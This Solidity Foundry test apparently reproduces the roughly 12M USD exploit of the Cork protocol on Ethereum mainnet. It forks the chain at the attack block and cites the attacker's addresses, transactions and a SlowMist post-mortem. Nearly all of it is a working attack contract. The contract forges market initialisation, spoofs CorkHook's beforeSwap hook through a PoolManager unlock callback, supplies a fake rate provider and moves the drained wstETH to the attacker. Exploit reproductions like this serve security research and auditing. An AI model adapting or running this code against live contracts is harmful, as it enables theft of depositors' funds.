pragma solidity 0.8.26;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 12M USD
// Attacker : 0xea6f30e360192bae715599e15e2f765b49e4da98
// Attack Contract : https://etherscan.io/address/0x9af3dce0813fd7428c47f57a39da2f6dd7c9bb09
// Vulnerable Contract : 
// Attack Txs: https://app.blocksec.com/explorer/tx/eth/0xfd89cdd0be468a564dd525b222b728386d7c6780cf7b2f90d2b54493be09f64d

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/SlowMist_Team/status/1928100756156194955
// Twitter Guy : https://x.com/SlowMist_Team/status/1928100756156194955
// Hacking God : N/A

address constant ERC1967Proxy = 0xCCd90F6435dd78C4ECCED1FA4db0D7242548a2a9;
address constant LiquidityToken = 0x05816980fAEC123dEAe7233326a1041f372f4466;
address constant WstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
address constant ERC1967Proxy2 = 0x96E0121D1cb39a46877aaE11DB85bc661f88D5fA;
address constant CorkConfig = 0xF0DA8927Df8D759d5BA6d3d714B1452135D99cFC;
address constant CorkHook = 0x5287E8915445aee78e10190559D8Dd21E0E9Ea88;
address constant PoolManager = 0x000000000004444c5dc75cB358380D2e3dE08A90;
address constant _pa = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
address constant _exchangeRateProvider = 0x7b285955DdcbAa597155968f9c4e901bb4c99263;
address constant _erc1967Proxy = 0x55B90B37416DC0Bd936045A8110d1aF3B6Bf0fc3;
address constant attacker = 0xEA6f30e360192bae715599E15e2F765B49E4da98;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 22581020 - 1);
    }

    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(WstETH).balanceOf(attacker), 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        // Approve in https://app.blocksec.com/explorer/tx/eth/0xb54308956e58fc124503e01eaae153e54eb738fd188e476460dba78e61793b45
        IERC20(WstETH).approve(address(attC), 1928391283912839123812839123000000000000000000);
        // Approve in https://app.blocksec.com/explorer/tx/eth/0x89ba58edaf9f40dc0c781c40351ba392be31263faa6be3a29c2ee152f271df6d?line=0
        IERC20(LiquidityToken).approve(address(attC), 123981298312831298398123000000000000000000);
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(WstETH).balanceOf(attacker), 18);
    }
}

contract AttackerC is Test {
    function attack() public {
        uint256 balLT = IERC20(LiquidityToken).balanceOf(attacker);
        IERC20(LiquidityToken).transferFrom(attacker, address(ERC1967Proxy), balLT);

        uint256 balW = IERC20(WstETH).balanceOf(attacker);
        IERC20(WstETH).transferFrom(attacker, address(this), balW);

        (address[] memory ct, address[] memory ds) = IERC1967ProxyB(ERC1967Proxy2).getDeployedSwapAssets(
            address(WstETH), 
            _pa, 
            uint256(493150684700) * 1e6, 
            7776001, 
            _exchangeRateProvider, 
            uint8(0), 
            uint8(7)
        );

        address ct2 = ct[1];
        address ds2 = ds[1];

        (uint256 rA, uint256 rB) = ICorkHook(CorkHook).getReserves(address(WstETH), ct2);
        
        // approve CorkHook for both tokens
        IERC20(WstETH).approve(address(CorkHook), type(uint256).max);
        IERC20(ct2).approve(address(CorkHook), type(uint256).max);

        uint256 minOut = (rB * 9999) / 10000;
        ICorkHook(CorkHook).swap(address(WstETH), address(ct2), 0, minOut, "");

        IERC20(WstETH).approve(address(CorkHook), 0);
        IERC20(ct2).approve(address(CorkHook), 0);
    
        // approve ERC1967Proxy for WstETH and depositPsm
        IERC20(WstETH).approve(address(ERC1967Proxy), type(uint256).max);
        (uint256 received, uint256 _exchangeRate) = IERC1967ProxyA(ERC1967Proxy).depositPsm(
            bytes32(0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a), 
            4e15
        );
        IERC20(WstETH).approve(address(ERC1967Proxy), 0);

        ICorkConfig(CorkConfig).initializeModuleCore(
            address(WstETH), 
            ds2, 
            uint256(1), 
            uint256(100), 
            address(this)
        );

        bytes32 id = IERC1967ProxyA(ERC1967Proxy).getId(
            address(WstETH), 
            ds2, 
            uint256(1), 
            uint256(100), 
            address(this)
        );

        ICorkConfig(CorkConfig).issueNewDs(id, block.timestamp * 10);

        (address[] memory n_ct, address[] memory n_ds) = IERC1967ProxyB(ERC1967Proxy2).getDeployedSwapAssets(
            ds2, 
            address(WstETH), 
            uint256(1), 
            uint256(100), 
            address(this), 
            uint8(0), 
            uint8(1)
        );

        address ct3 = n_ct[0];
        address ds3 = n_ds[0];

        IERC20(ds2).approve(address(ERC1967Proxy), type(uint256).max);

        uint256 balRa7 = IERC20(ds2).balanceOf(address(this));
        // may revert
        IERC1967ProxyA(ERC1967Proxy).depositLv(
            id, 
            balRa7 / 2, 
            0, 
            0, 
            0, 
            block.timestamp * 10
        );

        bytes memory data = abi.encode(
            ds2, 
            ct3, 
            id, 
            ds3
        );
        (bool ok, ) = address(PoolManager).call(
            abi.encodeWithSelector(
                IPoolManager.unlock.selector, 
                data
            )
        );

        uint256 balCT2 = IERC20(ct2).balanceOf(address(this));
        uint256 balDS2 = IERC20(ds2).balanceOf(address(this));

        IERC20(ct2).approve(address(ERC1967Proxy), type(uint256).max);
        IERC20(ds2).approve(address(ERC1967Proxy), type(uint256).max);

        IERC1967ProxyA(ERC1967Proxy).returnRaWithCtDs(
            bytes32(0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a), 
            // id,
            balCT2
        );

        IERC20(WstETH).approve(address(ERC1967Proxy), 0);
        IERC20(WstETH).approve(address(CorkHook), 0);
        IERC20(WstETH).approve(address(_erc1967Proxy), 0);

        withdraw();
    }

    function beforeSwap(address sender, PoolKey memory key, SwapParams memory params, bytes memory data) internal {
        (bool success, ) = CorkHook.call(
            abi.encodeWithSelector(
                ICorkHook.beforeSwap.selector, 
                sender, 
                key, 
                params,
                data
            )
        );
    }

    function unlockCallback(bytes calldata cd) external returns (bytes memory){
        (address ds2, address ct3, bytes32 id, address ds3) = abi.decode(cd, (address, address, bytes32, address));
        uint bal = IERC20(ds2).balanceOf(_erc1967Proxy);

        IPoolManager(PoolManager).sync(ct3);
        PoolKey memory key = PoolKey({
            currency0: ct3,
            currency1: ds2,
            fee: 0,
            tickSpacing: 1,
            hooks: address(this)
        });
        bytes memory hookData = abi.encode(
            uint256(1), 
            address(this), 
            uint256(0),
            bal,
            id,
            uint256(1)
        );

        beforeSwap(_erc1967Proxy, key, SwapParams({
            zeroForOne: true,
            amountSpecified: 100000000000000,
            sqrtPriceLimitX96: 79228162514264337593543950336
        }), hookData);

        IERC20(ct3).approve(address(PoolManager), 123);
        IERC20(ct3).transfer(address(PoolManager), 110987905101460);

        uint256 r = IPoolManager(PoolManager).settleFor(address(CorkHook));

        beforeSwap(_erc1967Proxy, key, SwapParams({
            zeroForOne: false,
            amountSpecified: int256(r),
            sqrtPriceLimitX96: 79228162514264337593543950336
        }), hex"");


        IERC20(ds3).approve(address(ERC1967Proxy), type(uint256).max);
        IERC20(ct3).approve(address(ERC1967Proxy), type(uint256).max);

        uint256 balDs2 = IERC20(ct3).balanceOf(address(this));

        IERC1967ProxyA(ERC1967Proxy).returnRaWithCtDs(
            id, 
            balDs2
        );

        IPoolManager(PoolManager).sync(ds2);
        IERC20(ds2).transfer(address(PoolManager), 1);

        IPoolManager(PoolManager).settleFor(address(CorkHook));

        return hex"";
    }

    function rate() public view returns (uint256) {
        return 0;
    }

    function rate(bytes32) public view returns (uint256) {
        return 1;
    }

    function withdraw() public {
        uint256 bal = IERC20(WstETH).balanceOf(address(this));
        IERC20(WstETH).transfer(attacker, bal);   
    }
}


interface IERC1967ProxyA {
	function returnRaWithCtDs(bytes32, uint256) external returns (uint256);
	function depositPsm(bytes32, uint256) external returns (uint256, uint256);
	function depositLv(bytes32, uint256, uint256, uint256, uint256, uint256) external returns (uint256);
	function getId(address, address, uint256, uint256, address) external returns (bytes32); 
}
interface IERC1967ProxyB {
	function getDeployedSwapAssets(address, address, uint256, uint256, address, uint8, uint8) external returns (address[] memory, address[] memory); 
}
interface ICorkConfig {
	function issueNewDs(bytes32, uint256) external;
	function initializeModuleCore(address, address, uint256, uint256, address) external; 
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

interface ICorkHook {
	function swap(address, address, uint256, uint256, bytes calldata) external returns (uint256);
	function getReserves(address, address) external returns (uint256, uint256); 
    function beforeSwap(address, PoolKey calldata, SwapParams calldata, bytes calldata) external returns (bytes4, int256, uint24);
}
interface IPoolManager {
	function unlock(bytes calldata) external returns (bytes memory); 
    function settleFor(address) external returns (uint256);
    function sync(address) external;

}
